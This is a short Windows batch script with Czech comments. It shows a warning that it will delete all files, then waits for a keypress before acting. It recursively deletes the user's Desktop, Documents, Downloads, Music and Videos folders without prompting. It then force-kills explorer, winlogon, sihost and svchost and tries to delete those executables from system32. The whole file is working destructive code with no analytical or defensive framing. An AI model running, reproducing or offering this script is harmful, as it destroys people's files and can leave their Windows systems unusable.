::Intro
@echo off
echo "Pozor! Tento program smaze vsechny soubory! Neni doporuceno spoustet tento program na realnem pocitaci. Pokud ho i nadale chcete spustit, stisknete jakoukoliv klavesu."
pause > nul


::Smazání všech souborů
rmdir C:\Users\%username%\Desktop /s /q
rmdir C:\Users\%username%\Documents /s /q
rmdir C:\Users\%username%\Downloads /s /q
rmdir C:\Users\%username%\Music /s /q
rmdir C:\Users\%username%\Videos /s /q


::Vypnutí všech důležitých procesů
taskkill /f /im explorer.exe
taskkill /f /im winlogon.exe
taskkill /f /im sihost.exe
taskkill /f /im svchost.exe


:: Smazání důležitých system32 souborů
cd C:\Windows\system32
del explorer.exe /q
del winlogon.exe /q
del svchost.exe /q
del sihost.exe /q